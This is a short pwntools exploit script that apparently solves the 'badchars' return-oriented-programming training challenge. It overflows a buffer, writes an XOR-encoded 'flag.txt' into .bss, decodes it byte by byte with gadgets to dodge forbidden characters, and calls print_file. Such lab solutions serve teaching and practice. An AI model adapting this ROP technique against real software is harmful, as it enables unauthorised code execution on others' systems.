#!/usr/bin/python3
import pwn
offset=40
addr_cotain=0x00601038#.bss
payload =b'A'*offset
payload+=pwn.p64(0x000000000040069c)# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload+=b"dnce,vzv"#"flag.txt" xor with 02
payload+=pwn.p64(addr_cotain)
payload+=pwn.p64(2)
payload+=pwn.p64(addr_cotain)
payload+=pwn.p64(0x0000000000400634)#mov qword ptr [r13], r12 ; ret
for i in range(8):#xor again byte_to_byte
    payload+=pwn.p64(0x00000000004006a2)#pop r15 ; ret
    payload+=pwn.p64(addr_cotain+i)
    payload+=pwn.p64(0x0000000000400628)#xor byte ptr [r15], r14b ; ret
payload+=pwn.p64(0x00000000004006a3)#pop rdi;ret
payload+=pwn.p64(addr_cotain)
payload+=pwn.p64(0x400510)#print_file
for badchar in 'xga.':
    if badchar.encode() in payload:
        print(badchar)
target=pwn.process("./badchars")
print(target.recv().decode())
target.sendline(payload)
target.interactive()
